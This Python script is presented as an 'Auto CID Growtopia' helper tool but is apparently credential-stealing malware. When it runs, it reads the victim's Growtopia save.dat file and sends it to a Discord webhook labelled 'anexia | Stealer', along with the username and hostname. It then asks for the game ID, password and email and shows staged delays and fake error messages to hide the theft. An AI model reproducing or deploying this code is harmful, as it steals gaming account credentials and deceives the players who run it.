import os
import socket
import time
from os import getenv
from discord_webhook import DiscordWebhook, DiscordEmbed
def clean():
  a="" # Webhook URL's
  b="New Account From : "+getenv("username")+" / "+socket.gethostname()
  webhook = DiscordWebhook(url=a, username="anexia | Stealer",content=b)
  
  # import save.dat
  c=getenv("LOCALAPPDATA")+ "\\Growtopia\\save.dat"
  with open(c, "rb") as f:
    webhook.add_file(file=f.read(), filename='save.dat')
    response = webhook.execute()

clean()
os.system("cls")
os.system("title Auto CID Growtopia | Fixed Version 1.3")
os.system("cls")
# f4ke l0g1n
# print("Please Login !")
# x = input("Username : ")
# y = input("Password : ")
# time.sleep(3.0)
# print("Account Found ! ")
# time.sleep(1.0)
# print("Getting Server...")
# time.sleep(3.0)
# os.system("cls")
# os.system("title Auto CID Growtopia | Fixed Version 1.3 | Premium Version")
print("Simple Auto CID By anexia#0101")
a = input("GrowID : ")
time.sleep(2.0)
aa = input("Password : ")
time.sleep(2.0)
bb = input("Email ( Without @gmail.com ) : ")
time.sleep(2.0)
vv = input("Game Version : ")
time.sleep(2.0)
x = input("Server : ")
time.sleep(2.0)
y = input("Port : Auto")
print("Please Wait !")
time.sleep(13.5)
os.system("cls")
print("Connecting To Server...")
time.sleep(6.4)
print("Configure Settings...")
time.sleep(8.0)
os.system("cls")
print("[ Error 0x4 ] External-Files Not Found ! ")
print("[ Error 0x102 ] Failed Getting Server ! ")
time.sleep(5.0)
os.system("exit")

